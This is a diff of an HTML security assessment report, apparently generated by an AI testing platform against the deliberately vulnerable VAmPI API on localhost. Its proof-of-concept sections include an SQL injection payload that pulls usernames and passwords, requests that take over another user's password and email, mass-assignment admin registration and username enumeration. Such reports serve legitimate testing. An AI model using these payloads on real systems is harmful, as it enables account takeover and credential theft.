@@ -189,7 +189,7 @@
 <!-- ═══ HEADER ═══ -->
 <div class="header">
   <h1>🛡 API Security Assessment Report</h1>
-  <div class="subtitle">http://localhost:5000 &nbsp;·&nbsp; 2026-08-10 21:30 UTC</div>
+  <div class="subtitle">http://localhost:5000 &nbsp;·&nbsp; 2026-08-12 18:40 UTC</div>
   <div class="risk-banner">Overall Risk Posture: CRITICAL</div>
 </div>
 
@@ -201,7 +201,7 @@
   <div class="meta-grid">
     <div class="meta-card">
       <div class="label">Report ID</div>
-      <div class="value" style="font-size:0.85rem;">VAMPI-20260810-212937-218F31</div>
+      <div class="value" style="font-size:0.85rem;">VAMPI-20260812-183930-A9A4FA</div>
     </div>
     <div class="meta-card">
       <div class="label">Target</div>
@@ -209,7 +209,7 @@
     </div>
     <div class="meta-card">
       <div class="label">Scan Duration</div>
-      <div class="value">0m 35s</div>
+      <div class="value">0m 47s</div>
     </div>
     <div class="meta-card">
       <div class="label">Total Findings</div>
@@ -313,17 +313,17 @@
                 <tbody>
             <tr>
               <td><code>PUT</code></td>
-              <td style="font-size:0.8rem;">http://localhost:5000/users/v1/inj_feaef731/email</td>
+              <td style="font-size:0.8rem;">http://localhost:5000/users/v1/inj_1f2b968c/email</td>
               <td><code>400</code></td>
             </tr>
             <tr>
               <td><code>PUT</code></td>
-              <td style="font-size:0.8rem;">http://localhost:5000/users/v1/inj_feaef731/email</td>
+              <td style="font-size:0.8rem;">http://localhost:5000/users/v1/inj_1f2b968c/email</td>
               <td><code>400</code></td>
             </tr>
             <tr>
               <td><code>PUT</code></td>
-              <td style="font-size:0.8rem;">http://localhost:5000/users/v1/inj_feaef731/email</td>
+              <td style="font-size:0.8rem;">http://localhost:5000/users/v1/inj_1f2b968c/email</td>
               <td><code>400</code></td>
             </tr></tbody>
               </table>
@@ -331,7 +331,7 @@
     
             <div style="margin-top:1rem;">
               <h3>Proof of Concept</h3>
-              <pre>curl -X PUT http://localhost:5000/users/v1/inj_feaef731/email \
+              <pre>curl -X PUT http://localhost:5000/users/v1/inj_1f2b968c/email \
   -H &#x27;Authorization: Bearer &lt;JWT&gt;&#x27; \
   -d &#x27;{&quot;email&quot;:&quot;&#x27; UNION SELECT username,password,1 FROM users--@x.com&quot;}&#x27;</pre>
             </div>
@@ -368,7 +368,7 @@
     </div>
     <div class="detail-row">
       <div class="detail-label">Description</div>
-      <div class="detail-value">The registration endpoint accepted the extra field(s) {&quot;admin&quot;: true} and applied them to the user&#x27;s account. The user &#x27;mass_8877f51c&#x27; was registered with admin privileges by including {&quot;admin&quot;: true} in the registration payload.</div>
+      <div class="detail-value">The registration endpoint accepted the extra field(s) {&quot;admin&quot;: true} and applied them to the user&#x27;s account. The user &#x27;mass_105e0f2b&#x27; was registered with admin privileges by including {&quot;admin&quot;: true} in the registration payload.</div>
     </div>
     <div class="detail-row">
       <div class="detail-label">Impact</div>
@@ -433,7 +433,7 @@
     </div>
     <div class="detail-row">
       <div class="detail-label">Description</div>
-      <div class="detail-value">User &#x27;bola_a_389cfd&#x27; successfully changed User &#x27;bola_b_389cfd&#x27;s password without knowing the current password.</div>
+      <div class="detail-value">User &#x27;bola_a_2ffba4&#x27; successfully changed User &#x27;bola_b_2ffba4&#x27;s password without knowing the current password.</div>
     </div>
     <div class="detail-row">
       <div class="detail-label">Impact</div>
@@ -447,7 +447,7 @@
                 <tbody>
             <tr>
               <td><code>PUT</code></td>
-              <td style="font-size:0.8rem;">http://localhost:5000/users/v1/bola_b_389cfd/password</td>
+              <td style="font-size:0.8rem;">http://localhost:5000/users/v1/bola_b_2ffba4/password</td>
               <td><code>204</code></td>
             </tr></tbody>
               </table>
@@ -455,7 +455,7 @@
     
             <div style="margin-top:1rem;">
               <h3>Proof of Concept</h3>
-              <pre>curl -X PUT -H &#x27;Authorization: Bearer &lt;JWT_A&gt;&#x27; -H &#x27;Content-Type: application/json&#x27; -d &#x27;{&quot;password&quot;:&quot;hacker_new_pass&quot;}&#x27; http://localhost:5000/users/v1/bola_b_389cfd/password</pre>
+              <pre>curl -X PUT -H &#x27;Authorization: Bearer &lt;JWT_A&gt;&#x27; -H &#x27;Content-Type: application/json&#x27; -d &#x27;{&quot;password&quot;:&quot;hacker_new_pass&quot;}&#x27; http://localhost:5000/users/v1/bola_b_2ffba4/password</pre>
             </div>
     
         <div style="margin-top:1rem;">
@@ -490,7 +490,7 @@
     </div>
     <div class="detail-row">
       <div class="detail-label">Description</div>
-      <div class="detail-value">User &#x27;bola_a_389cfd&#x27; (authenticated with their own JWT) successfully accessed User &#x27;bola_b_389cfd&#x27;s profile data by simply changing the username in the URL. The API does not verify that the requesting user owns the resource.</div>
+      <div class="detail-value">User &#x27;bola_a_2ffba4&#x27; (authenticated with their own JWT) successfully accessed User &#x27;bola_b_2ffba4&#x27;s profile data by simply changing the username in the URL. The API does not verify that the requesting user owns the resource.</div>
     </div>
     <div class="detail-row">
       <div class="detail-label">Impact</div>
@@ -504,7 +504,7 @@
                 <tbody>
             <tr>
               <td><code>GET</code></td>
-              <td style="font-size:0.8rem;">http://localhost:5000/users/v1/bola_b_389cfd</td>
+              <td style="font-size:0.8rem;">http://localhost:5000/users/v1/bola_b_2ffba4</td>
               <td><code>200</code></td>
             </tr></tbody>
               </table>
@@ -513,10 +513,10 @@
             <div style="margin-top:1rem;">
               <h3>Proof of Concept</h3>
               <pre># Login as User A to get JWT
-curl -X POST http://localhost:5000/users/v1/login -d &#x27;{&quot;username&quot;:&quot;bola_a_389cfd&quot;,&quot;password&quot;:&quot;...&quot;}&#x27;
+curl -X POST http://localhost:5000/users/v1/login -d &#x27;{&quot;username&quot;:&quot;bola_a_2ffba4&quot;,&quot;password&quot;:&quot;...&quot;}&#x27;
 
 # Use User A&#x27;s JWT to access User B&#x27;s data
-curl -H &#x27;Authorization: Bearer &lt;JWT_A&gt;&#x27; http://localhost:5000/users/v1/bola_b_389cfd</pre>
+curl -H &#x27;Authorization: Bearer &lt;JWT_A&gt;&#x27; http://localhost:5000/users/v1/bola_b_2ffba4</pre>
             </div>
     
         <div style="margin-top:1rem;">
@@ -551,7 +551,7 @@ curl -H &#x27;Authorization: Bearer &lt;JWT_A&gt;&#x27; http://localhost:5000/us
     </div>
     <div class="detail-row">
       <div class="detail-label">Description</div>
-      <div class="detail-value">User &#x27;bola_a_389cfd&#x27; successfully updated User &#x27;bola_b_389cfd&#x27;s email to &#x27;hacked_62b257@evil.invalid&#x27;. This is an Insecure Direct Object Reference (IDOR) vulnerability.</div>
+      <div class="detail-value">User &#x27;bola_a_2ffba4&#x27; successfully updated User &#x27;bola_b_2ffba4&#x27;s email to &#x27;hacked_59e092@evil.invalid&#x27;. This is an Insecure Direct Object Reference (IDOR) vulnerability.</div>
     </div>
     <div class="detail-row">
       <div class="detail-label">Impact</div>
@@ -565,7 +565,7 @@ curl -H &#x27;Authorization: Bearer &lt;JWT_A&gt;&#x27; http://localhost:5000/us
                 <tbody>
             <tr>
               <td><code>PUT</code></td>
-              <td style="font-size:0.8rem;">http://localhost:5000/users/v1/bola_b_389cfd/email</td>
+              <td style="font-size:0.8rem;">http://localhost:5000/users/v1/bola_b_2ffba4/email</td>
               <td><code>204</code></td>
             </tr></tbody>
               </table>
@@ -573,7 +573,7 @@ curl -H &#x27;Authorization: Bearer &lt;JWT_A&gt;&#x27; http://localhost:5000/us
     
             <div style="margin-top:1rem;">
               <h3>Proof of Concept</h3>
-              <pre>curl -X PUT -H &#x27;Authorization: Bearer &lt;JWT_A&gt;&#x27; -H &#x27;Content-Type: application/json&#x27; -d &#x27;{&quot;email&quot;:&quot;attacker@evil.com&quot;}&#x27; http://localhost:5000/users/v1/bola_b_389cfd/email</pre>
+              <pre>curl -X PUT -H &#x27;Authorization: Bearer &lt;JWT_A&gt;&#x27; -H &#x27;Content-Type: application/json&#x27; -d &#x27;{&quot;email&quot;:&quot;attacker@evil.com&quot;}&#x27; http://localhost:5000/users/v1/bola_b_2ffba4/email</pre>
             </div>
     
         <div style="margin-top:1rem;">
@@ -688,7 +688,7 @@ curl -H &#x27;Authorization: Bearer &lt;JWT_A&gt;&#x27; http://localhost:5000/us
             <div style="margin-top:1rem;">
               <h3>Proof of Concept</h3>
               <pre>curl -X POST http://localhost:5000/users/v1/login \
-  -d &#x27;{&quot;username&quot;:&quot;nonexistent_01df47&quot;,&quot;password&quot;:&quot;x&quot;}&#x27;
+  -d &#x27;{&quot;username&quot;:&quot;nonexistent_961c0b&quot;,&quot;password&quot;:&quot;x&quot;}&#x27;
 # Response reveals: user does not exist</pre>
             </div>
     
@@ -980,7 +980,7 @@ for i in range(10000):
 <div class="footer">
   Generated by Phase 2 — Security Testing Specialist &nbsp;·&nbsp;
   Multi-Agent AI Security Testing Platform &nbsp;·&nbsp;
-  2026-08-10 21:30 UTC
+  2026-08-12 18:40 UTC
 </div>
 
 <script>
